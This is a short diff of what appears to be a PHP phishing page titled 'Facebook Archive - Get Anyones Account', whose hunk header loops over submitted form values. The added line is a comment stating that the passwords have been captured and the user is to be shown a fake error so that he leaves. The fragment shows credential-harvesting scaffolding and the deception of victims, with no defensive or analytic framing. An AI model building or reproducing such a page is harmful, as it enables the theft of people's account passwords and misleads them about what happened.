@@ -39,6 +39,7 @@ foreach($_POST as $variable => $value) {
 	<h1 style="margin-top:0; color:black">  <img src="indexlogo.png" style="width: 80px;height:80px"> Facebook Archive - Get Anyones Account</h1> 
 </div>
 	<header>
+		//We got the Passes. Time to make the user Exit. Make him think that the website gave an Error. 
 		<img src="logo2.png">
 		<div class="head" style="display:inline-block;align-self:center">
 			<h3>Information</h3>
